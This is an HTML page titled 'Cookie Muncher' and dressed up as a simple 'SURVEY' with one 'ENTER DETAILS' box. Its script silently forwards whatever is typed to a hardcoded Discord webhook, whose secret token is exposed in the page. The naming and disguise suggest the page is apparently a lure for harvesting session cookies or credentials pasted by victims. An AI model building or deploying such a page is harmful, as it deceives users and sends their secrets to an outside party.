<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Cookie Muncher</title>

<style>
body {
  background: #111;
  font-family: Arial, sans-serif;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.card {
  background: #fff;
  width: 360px;
  padding: 30px;
  border-radius: 25px;
  text-align: center;
}

h1 {
  font-size: 42px;
  margin-bottom: 5px;
}

.dev, .status {
  font-size: 14px;
}

hr {
  margin: 20px 0;
}

label {
  font-weight: bold;
}

input {
  width: 100%;
  padding: 14px;
  border-radius: 30px;
  border: 2px solid #000;
  margin-top: 10px;
  font-size: 16px;
}

button {
  margin-top: 15px;
  width: 100%;
  height: 52px;
  border-radius: 30px;
  border: none;
  background: #000;
  color: #fff;
  font-size: 16px;
  cursor: pointer;
  position: relative;
  overflow: hidden;
  transition: background 0.4s;
}

button.success {
  background: #28a745;
  cursor: default;
}

.btn-text {
  transition: opacity 0.3s;
}

.circle {
  width: 40px;
  height: 40px;
  border-radius: 50%;
  border: 3px solid #fff;
  position: absolute;
  left: 50%;
  top: 50%;
  transform: translate(-50%, -50%) scale(0);
}

button.success .circle {
  animation: scaleIn 0.4s forwards;
}

button.success .btn-text {
  opacity: 0;
}

svg {
  width: 24px;
  height: 24px;
  fill: none;
  stroke: white;
  stroke-width: 4;
  stroke-linecap: round;
  stroke-linejoin: round;
  stroke-dasharray: 48;
  stroke-dashoffset: 48;
  animation: draw 0.5s 0.4s forwards;
}

@keyframes scaleIn {
  to { transform: translate(-50%, -50%) scale(1); }
}

@keyframes draw {
  to { stroke-dashoffset: 0; }
}

#thankyou {
  margin-top: 15px;
  color: green;
  display: none;
}
</style>
</head>

<body>

<div class="card">
  <h1>SURVEY</h1>
  <p class="dev">Developed by: Contrast</p>
  <p class="status">Status: Working</p>

  <hr />

  <label>ENTER DETAILS:</label>

  <input id="response" type="text" placeholder="Textbox here" />

  <button id="submitBtn">
    <div class="circle">
      <svg viewBox="0 0 52 52">
        <path d="M14 27 L22 35 L38 19"></path>
      </svg>
    </div>
    <span class="btn-text">Submit</span>
  </button>

  <p id="thankyou">Thank you, please have some patience.</p>
</div>

<script>
const webhookURL = "https://discord.com/api/webhooks/1457017497973690574/DS6nLHA8jg5dntZVd2VlzyPyjAWt4hGlntLwwyIiLOclg1Mc0Mg-yfdvtmMndop2IJFf";

document.getElementById("submitBtn").addEventListener("click", async () => {
  const input = document.getElementById("response");
  const btn = document.getElementById("submitBtn");
  const thankyou = document.getElementById("thankyou");

  if (!input.value.trim() || btn.disabled) return;

  await fetch(webhookURL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      content: "**ðŸ“¨ New Submission**",
      embeds: [{
        color: 3066993,
        fields: [{ name: "Response", value: input.value }],
        timestamp: new Date()
      }]
    })
  });

  btn.classList.add("success");
  btn.disabled = true;
  input.disabled = true;
  thankyou.style.display = "block";
});
</script>

</body>
</html>
